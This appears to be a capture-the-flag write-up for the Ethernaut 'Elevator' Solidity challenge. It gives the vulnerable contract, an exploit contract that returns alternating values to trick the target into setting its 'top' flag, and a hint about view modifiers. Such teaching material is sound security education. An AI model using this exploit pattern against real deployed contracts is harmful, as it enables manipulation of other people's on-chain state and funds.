# Elevator



This elevator won't let you reach the top of your building. Right?

Things that might help:
- Sometimes solidity is not good at keeping promises.
- This Elevator expects to be used from a Building.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

```

## Solution

To complete this challenge we have to set the top variable of the Elevator contract to true. 

In order to achive that the `isLastFloor` function in the `Building` contract should return `false` when called first for the if condition

- `if (! building.isLastFloor(_floor))   `

 andreturn `true` when called for the second time for the variable assignment 
 - `top = building.isLastFloor(floor);`

```

contract Building {

  Elevator elevator;
  bool toggle = true;
  function isLastFloor(uint _floor) external returns (bool){
    toggle = !toggle;
    return toggle;
  }

  function callGoTo(address _elevator) public {
    elevator = Elevator(_elevator);
    elevator.goTo(1);

  }
}

```


### Hint from Ethernaut

You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().